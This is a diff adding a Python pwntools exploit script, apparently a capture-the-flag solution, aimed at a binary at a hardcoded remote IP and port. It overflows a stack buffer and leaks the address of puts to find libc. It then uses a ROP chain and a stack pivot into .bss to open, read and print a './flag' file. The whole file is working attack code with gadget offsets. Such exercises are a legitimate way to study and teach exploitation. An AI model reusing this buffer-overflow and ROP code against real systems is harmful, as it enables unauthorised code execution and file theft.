@@ -1,0 +1,78 @@
+from pwn import *
+from LibcSearcher import *
+context(os="linux", arch="amd64", log_level="debug")
+
+io = remote("106.15.72.34",31549)
+#io = process('./vuln')
+elf = ELF('./vuln')
+
+
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
+main_addr=0x401292
+pop_rdi_ret=0x4013e3
+ret=0x40101a
+vuln = 0x40125B
+
+payload = b'a'*0x108+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
+io.sendafter("accord.\n\n",payload)
+
+puts_addr=u64(io.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
+print(hex(puts_addr))
+
+#libc_base = puts_addr - libc.sym['puts']
+
+libc_base = puts_addr - 0x084420
+print("base = ",hex(libc_base))
+
+rdi = 0x4013e3
+rsi = libc_base + 0x2601f
+rdx = libc_base + 0x119211
+rsp = libc_base + 0x2f70a
+
+read_real=libc_base+0x10DFC0
+
+open_real=libc_base+0x10DCE0
+
+write_real=libc_base+0x10E060
+
+bss_addr = 0x404090
+pop_rax_ret = 0x36174 + libc_base
+#gdb.attach(io)
+
+### read_bss
+bss_base=0x404090
+
+# read(int fd, void *buf, size_t count);
+fd=0
+buf=bss_base+0x100
+count=0x200
+
+payload=b'a'*0x108+p64(rsi)+p64(buf)+p64(read_real)+p64(rsp)+p64(buf+8)
+io.send(payload)
+ 
+### rop->bss
+payload=b'./flag'.ljust(8,b'\x00')
+
+# open(const char *pathname, int flags)
+pathname_ptr=buf
+flags=0
+payload+=p64(rdi)+p64(pathname_ptr)+p64(rsi)+p64(flags)+p64(open_real)
+
+
+# read(int fd, void *buf, size_t count);
+fd=3
+buf2=buf+0x300
+count=0x100
+payload+=p64(rdi)+p64(fd)+p64(rsi)+p64(buf2)+p64(rdx)+p64(count)+p64(0)+p64(read_real)
+
+
+# write(int handle,void* buf,int length)
+handle=1
+buf3=buf2
+length=0x50
+payload+=p64(rdi)+p64(1)+p64(rsi)+p64(buf3)+p64(rdx)+p64(length)+p64(0)+p64(write_real)+p64(vuln)
+
+io.sendafter("accord.\n\n",payload)
+
+io.interactive()
